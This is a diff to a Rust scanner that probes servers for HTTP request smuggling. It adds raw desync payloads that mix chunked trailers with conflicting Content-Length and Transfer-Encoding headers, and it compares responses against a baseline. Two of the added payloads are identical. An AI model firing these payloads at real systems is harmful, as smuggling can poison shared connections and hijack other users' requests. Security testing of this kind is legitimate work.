@@ -4,6 +4,7 @@ use async_trait::async_trait;
 use riphttplib::types::{ClientTimeouts, ProtocolError, Request};
 use riphttplib::{H1, Protocol, parse_target};
 use std::time::Duration;
+use std::thread;
 
 const CONNECT_TIMEOUT: Duration = Duration::from_secs(3);
 const IO_TIMEOUT: Duration = Duration::from_secs(10);
@@ -44,7 +45,7 @@ impl TrailSmugTask {
             aa\r\n\
             0\r\n\
             any: value\r\n\
-            GET /hopefully404?: HTTP/1.1\r\n\
+            GET /vcmapfqpie/xsqweer?: HTTP/1.1\r\n\
             X: "
         ));
 
@@ -59,7 +60,7 @@ impl TrailSmugTask {
             aa\r\n\
             0\r\n\
             any: value\n\n\
-            GET /hopefully404?: HTTP/1.1\r\n\
+            GET /vcmapfqpie/xsqweer?: HTTP/1.1\r\n\
             X: "
         ));
 
@@ -74,13 +75,13 @@ impl TrailSmugTask {
             aa\r\n\
             0\r\n\
             a\r\n\
-            TRACE /hopefully404?: HTTP/1.1\r\n\
+            TRACE /vcmapfqpie/xsqweer?: HTTP/1.1\r\n\
             X: "
         ));
 
         let smug = format!(
             "\
-            TRACE /hopefully404 HTTP/1.1\r\n\
+            TRACE /vcmapfqpie/xsqweer HTTP/1.1\r\n\
             X: "
         );
         let len = smug.len();
@@ -126,6 +127,54 @@ impl TrailSmugTask {
             {smug}"
         ));
 
+        payloads.push(format!(
+            "\
+            HEAD {path} HTTP/1.1\r\n\
+            Host: {authority}\r\n\
+            Connection: keep-alive\r\n\
+            User-Agent: {HTTP_USER_AGENT}\r\n\
+            Content-Length: {len}\r\n\
+            Content-Type: application/www-form-urlencoded\r\n\
+            a\r\n\
+            \r\n\
+            {smug}"
+        ));
+
+        payloads.push(format!(
+            "\
+            OPTIONS {path} HTTP/1.1\r\n\
+            Host: {authority}\r\n\
+            Connection: keep-alive\r\n\
+            User-Agent: {HTTP_USER_AGENT}\r\n\
+            Content-Length: {len}\r\n\
+            Content-Type: application/www-form-urlencoded\r\n\
+            Expect:\r\n\t100-continue\r\n\
+            \r\n\
+            {smug}"
+        ));
+
+        payloads.push(format!("\
+            GET {path} HTTP/1.1\r\n\
+            Host: {authority}\r\n\
+            Content-Length: {len}\r\n\
+            Transfer-Encoding: Chunked\r\n\
+            \r\n\
+            0\r\n\
+            \r\n\
+            {smug}
+        "));
+
+        payloads.push(format!("\
+            GET {path} HTTP/1.1\r\n\
+            Host: {authority}\r\n\
+            Content-Length: {len}\r\n\
+            Transfer-Encoding: Chunked\r\n\
+            \r\n\
+            0\r\n\
+            \r\n\
+            {smug}
+        "));
+
         Ok(payloads)
     }
 }
@@ -164,9 +213,11 @@ impl Task for TrailSmugTask {
             return Ok("".to_string());
         }
 
+        let probes = 2;
+
         for req in &attacks {
             let mut diff = false;
-            for i in 0..2 { // two probes
+            for i in 0..probes {
                 // send attack
                 client.send_raw(&target, req.to_string().into()).await?;
                 // send base and check if there's a difference
@@ -175,21 +226,26 @@ impl Task for TrailSmugTask {
                     .await
                 {
                     Ok(res) => {
-                        if res.status != baseline_res.status && ![403, 429].contains(&res.status) {
-                            if i == 0 {
+                        if res.status != baseline_res.status && ![403, 429, 502, 503].contains(&res.status) {
+                            if i != (probes-1) {
                                 diff = true;
                             } else if diff {
                                 findings.push(format!(
                                     "[!] {} resp difference: baseline {} curr {} payload {}",
                                     target, baseline_res.status, res.status, req
                                 ));
+                            } else {
+                                break;
                             }
+                        } else {
+                            break;
                         }
                     }
                     Err(_) => {
                         return Ok(findings.join("\n"));
                     }
                 };
+                thread::sleep(Duration::from_millis(2000));
             }
         }
 
